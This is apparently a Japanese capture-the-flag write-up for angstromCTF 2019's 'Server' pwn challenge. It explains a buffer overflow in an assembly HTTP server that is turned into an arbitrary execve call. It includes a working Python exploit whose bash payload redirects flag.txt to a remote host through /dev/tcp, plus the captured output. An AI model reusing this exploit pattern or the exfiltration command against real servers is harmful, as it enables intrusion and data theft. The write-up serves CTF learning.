# [pwn 180pts] Server - angstromCTF 2019
64bitで全部無効です。というかアセンブリ製です。
```
$ checksec server
[*] 'server'
    Arch:	64 bits (little endian)
    NX:		NX disabled
    SSP:	SSP disabled (No canary found)
    RELRO:	No RELRO
    PIE:	PIE disabled
```

HTTPサーバーのバイナリです。
URLを読み込む際にバッファオーバーフローがあります。
bssセクションにある変数なので、書き換えられるのはsocketのfdやリクエストを入れるバッファなどです。

なのでそれだけではどうということは無いのですが、次のような箇所があります。
（IDAが`sys_write`みたいなのを表示してくれないのでしばらく気づかなかった。）

```nasm
mov     rdi, fd
mov     eax, 1
mov     rsi, offset aWelcomeToMyWeb ; "welcome to my web server! as you can se"...
mov     rdx, welcome_size ; count
syscall                 ; LINUX - sys_write
sub     rax, rdx
add     rax, 3
xor     rdx, rdx
syscall                 ; LINUX -
mov     eax, 3Ch
syscall                 ; LINUX - sys_exit
```

謎のsyscallがありますが、通常は`sys_write`で出力された文字数がraxに入り、rdxには出力する文字数(count)が入っているので、subとaddでraxは3となり、結果として`sys_close(0)`が呼び出されます。
しかし、countやfdはbssにあるため、これらを上書きすれば`sys_write`がエラーを起こしてraxに大きな値が返ります。
具体的には、fdが存在しないファイルディスクリプタの場合、`sys_write`は0xfffffffffffffff7を返します。
また、rdxは操作可能なので、結果としてraxを制御でき、任意のシステムコールが呼び出せます。
おまけにrsiはウェルカムメッセージへのポインタが入っており、rdiはfdと同じになっています。
したがって、第一引数の値と、第二引数が指すポインタにあるデータは操作可能です。
rdxは0になっているので第三引数は0です。
なんか指定したアドレスを呼び出してくれるシステムコールが無いか探しましたがありませんでした。
そこで、`execve`を使うことにします。
ソケット経由でデータが流れてくるため、一見シェルを起動しても無駄に思えますが、`/bin/bash -c 'hogehoge'`のようにコマンドを実行することができます。
bashでは`/dev/tcp/IP ADDRESS/PORT NUMBER`にリダイレクトすることでTCPでデータを送ることができるため、自分のサーバーを立ててこれをしました。

lsの結果を送るとflag.txtがあることが分かったので、その内容を取得します。

```python
from ptrlib import *

syscall_num = 59 # sys_execve

addr_buf = 0x4028b1
addr_msg = 0x402840

struct = b''
struct += p64(addr_msg)
struct += p64(addr_msg + 10)
struct += p64(addr_msg + 13)
struct += p64(0)
struct += b'/bin/bash\x00' # addr_msg
struct += b'-c\x00' # addr_msg + 10
struct += b'cat<flag.txt>&/dev/tcp/??.??.??.??/9999' # addr_msg + 13
struct += b'\x00' * (0x58 - len(struct))
struct = struct[:-1] + b' '

URL = b"A" * 0x800
URL += p64(addr_msg) # file descriptor
URL += p64(0xfffffffffffffff7 + 3 - syscall_num) # size
URL += struct

REQUEST = b"HELLO WORLD!"

#sock = Socket("localhost", 19303)
sock = Socket("shell.actf.co", 19303)

payload = b"GET "
payload += URL
payload += REQUEST
sock.send(payload)
sock.interactive()
```

私のPC：
```
$ python solve.py 
[+] Socket: Successfully connected to shell.actf.co:19303
[ptrlib]$ HTTP/1.1 200 OK
```

私のサーバー：
```
$ nc -l -p 9999
actf{the_true_w3b_a5s3mbly}
```

コマンドをREQUESTの方に書けばもっと長いコマンドも実行できますが、謎のこだわりでURLで全部済ましました。

# 感想
あまりこういうタイプのpwnを解く機会はないので面白かったです。
